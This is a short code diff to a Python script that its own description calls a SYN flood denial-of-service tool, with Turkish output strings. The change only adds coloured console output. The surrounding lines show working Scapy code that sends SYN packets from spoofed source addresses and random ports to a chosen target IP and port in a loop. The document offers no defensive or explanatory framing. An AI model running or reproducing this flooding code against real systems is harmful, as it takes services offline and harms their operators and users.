@@ -1,6 +1,9 @@
 import argparse
 import random
 from scapy.all import *
+from colorama import init, Fore
+
+init(autoreset=True)
 
 def syn_flood(target_ip, target_port, packet_count):
     for i in range(packet_count):
@@ -8,7 +11,7 @@ def syn_flood(target_ip, target_port, packet_count):
         src_port = random.randint(1024, 65535)
         packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
         send(packet, verbose=False)
-        print(f"[+] Paket gönderildi {i+1}/{packet_count}")
+        print(Fore.GREEN + f"[+] Paket gönderildi {i+1}/{packet_count}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="SYN Flood DOS Aracı")
